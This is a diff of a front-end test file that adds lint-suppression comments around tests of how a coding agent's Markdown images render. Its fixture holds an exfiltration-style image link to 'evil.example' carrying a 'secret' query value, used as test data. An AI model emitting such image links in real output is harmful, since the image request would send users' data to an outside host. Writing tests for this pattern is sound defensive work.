@@ -115,6 +115,7 @@ describe("chat text direction", () => {
     });
 });
 
+/* eslint-disable testing-library/no-container, testing-library/no-node-access, testing-library/render-result-naming-convention -- these assert on the raw DOM: an image with an empty alt has no role to query by */
 describe("a coding agent's Markdown images", () => {
     const reply = "A chart ![chart](out/chart.png) and a pixel ![](https://evil.example/?q=secret).";
 
@@ -145,3 +146,4 @@ describe("a coding agent's Markdown images", () => {
         expect(container.querySelector("img[src^='https://evil.example']")).not.toBeNull();
     });
 });
+/* eslint-enable testing-library/no-container, testing-library/no-node-access, testing-library/render-result-naming-convention */
